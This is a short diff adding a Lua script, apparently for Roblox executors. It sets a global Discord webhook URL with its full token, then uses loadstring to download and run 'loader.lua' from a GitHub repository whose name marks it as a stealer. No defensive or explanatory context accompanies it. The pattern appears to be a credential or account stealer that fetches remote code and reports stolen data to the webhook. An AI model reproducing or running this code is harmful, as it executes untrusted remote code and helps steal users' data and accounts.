@@ -1,0 +1,4 @@
+_G.webhook = "https://discord.com/api/webhooks/1393497501197406342/NUL81yH9eF1tu59o3dpBTdsHrEXUxfnH8AurqqQr0hypctbWDfqHK47lrYKasWD3q7PC"
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Saikistelerr/Totoong-stealer-na-walang-halong-nakaw/refs/heads/main/loader.lua"))()
